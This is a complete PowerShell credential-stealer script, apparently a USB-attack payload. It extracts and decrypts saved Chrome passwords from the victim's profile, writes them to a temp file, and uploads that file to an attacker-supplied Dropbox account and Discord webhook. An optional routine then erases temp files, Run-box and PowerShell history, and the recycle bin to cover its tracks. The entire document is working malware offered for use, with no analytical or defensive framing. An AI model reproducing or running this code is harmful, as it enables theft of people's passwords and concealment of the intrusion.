function AppendToFile {
    param (
        [string]$Data
    )
    Add-Content -Path $outputFilePath -Value $Data
}

############################################################################################################################################################

$dataPath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Default\\Login Data"
$query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"

# If the target has PowerShell 7.x installed, passwords created in Chrome
# after v80 was installed can also be decoded.
$decoder = $null
if ((Get-Host).Version.Major -eq 7) {
    $localStatePath="$($env:LOCALAPPDATA)\\Google\\Chrome\\User Data\\Local State"
    $localStateData = Get-Content -Raw $localStatePath
    $keyBase64 = (ConvertFrom-Json $localStateData).os_crypt.encrypted_key
    $keyBytes = [System.Convert]::FromBase64String($keyBase64)
    $keyBytes = $keyBytes[5..($keyBytes.length-1)]  # Remove 'DPAPI' from start
    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
        $keyBytes,
        $null,
        [Security.Cryptography.DataProtectionScope]::CurrentUser
    )
    $decoder = [Security.Cryptography.AesGcm]::New($masterKey)
}

$outputFilePath = "$env:TEMP\chrome-pass.txt"  # Output file path

Add-Type -AssemblyName System.Security
Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class WinSQLite3
    {
        const string dll = "winsqlite3";

        [DllImport(dll, EntryPoint="sqlite3_open")]
        public static extern IntPtr Open([MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr db);

        [DllImport(dll, EntryPoint="sqlite3_prepare16_v2")]
        public static extern IntPtr Prepare2(IntPtr db, [MarshalAs(UnmanagedType.LPWStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);

        [DllImport(dll, EntryPoint="sqlite3_step")]
        public static extern IntPtr Step(IntPtr stmt);

        [DllImport(dll, EntryPoint="sqlite3_column_text16")]
        static extern IntPtr ColumnText16(IntPtr stmt, int index);

        [DllImport(dll, EntryPoint="sqlite3_column_bytes")]
        static extern int ColumnBytes(IntPtr stmt, int index);

        [DllImport(dll, EntryPoint="sqlite3_column_blob")]
        static extern IntPtr ColumnBlob(IntPtr stmt, int index);

        public static string ColumnString(IntPtr stmt, int index)
        { 
            return Marshal.PtrToStringUni(WinSQLite3.ColumnText16(stmt, index));
        }

        public static byte[] ColumnByteArray(IntPtr stmt, int index)
        {
            int length = ColumnBytes(stmt, index);
            byte[] result = new byte[length];
            if (length > 0)
                Marshal.Copy(ColumnBlob(stmt, index), result, 0, length);
            return result;
        }

        [DllImport(dll, EntryPoint="sqlite3_errmsg16")]
        public static extern IntPtr Errmsg(IntPtr db);

        public static string GetErrmsg(IntPtr db)
        {
            return Marshal.PtrToStringUni(Errmsg(db));
        }
    }
"@

$dbH = 0
if([WinSQLite3]::Open($dataPath, [ref] $dbH) -ne 0) {
    Write-Host "Failed to open!"
    [WinSQLite3]::GetErrmsg($dbh)
    exit
}

$stmt = 0
if ([WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) -ne 0) {
    Write-Host "Failed to prepare!"
    [WinSQLite3]::GetErrmsg($dbh)
    exit
}

while([WinSQLite3]::Step($stmt) -eq 100) {

    $url = [WinSQLite3]::ColumnString($stmt, 0)
    $username = [WinSQLite3]::ColumnString($stmt, 1)
    $encryptedPassword = [WinSQLite3]::ColumnByteArray($stmt, 2)

    try {
        $passwordBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedPassword,
            $null,
            [Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        $password = [System.Text.Encoding]::ASCII.GetString($passwordBytes)
        
        # Append data to the output file
        AppendToFile "$url  ||  $username  ||  $password`n"
        continue

    } catch [System.Security.Cryptography.CryptographicException] {
        # Strange no-consequence exception bubbles up and we can safely ignore
        # it.
    }

    # Try any that failed above with the v80+ decoding, if we have PowerShell
    # 7.x.
    if ($decoder -ne $null) {
        $nonce = $encryptedPassword[3..14]
        $cipherText = $encryptedPassword[15..($encryptedPassword.length-17)]
        $tag = $encryptedPassword[($encryptedPassword.length-16)..($encryptedPassword.length-1)]
        $unencryptedBytes = [byte[]]::new($cipherText.length)
        $decoder.Decrypt($nonce, $cipherText, $tag, $unencryptedBytes)
        $password = [System.Text.Encoding]::ASCII.GetString($unencryptedBytes)

        # Append data to the output file
        AppendToFile "$url  ||  $username  ||  $password`n"
    }
}

############################################################################################################################################################

# Upload output file to Dropbox

function DropBox-Upload {

	[CmdletBinding()]
	param (
	[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
	[Alias("f")]
	[string]$SourceFilePath
	) 
	$outputFile = Split-Path $SourceFilePath -leaf
	$TargetFilePath="/$outputFile"
	$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
	$authorization = "Bearer " + $db
	$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
	$headers.Add("Authorization", $authorization)
	$headers.Add("Dropbox-API-Arg", $arg)
	$headers.Add("Content-Type", 'application/octet-stream')
	Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not ([string]::IsNullOrEmpty($db))) {
	DropBox-Upload -f $outputFilePath
}

############################################################################################################################################################

function Upload-Discord {

    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
        )

    $hookurl = "$dc"

    $Body = @{
        'username' = $env:username
        'content' = $text
        }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    };

    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

if (-not ([string]::IsNullOrEmpty($dc))) {
    Upload-Discord -file $outputFilePath
}

############################################################################################################################################################

function Clean-Exfil { 

	# empty temp folder
	rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

	# delete run box history
	reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

	# Delete powershell history
	Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

	# Empty recycle bin
	Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

############################################################################################################################################################

if (-not ([string]::IsNullOrEmpty($ce))) {
	Clean-Exfil
}


RI $env:TEMP/chrome-pass.txt
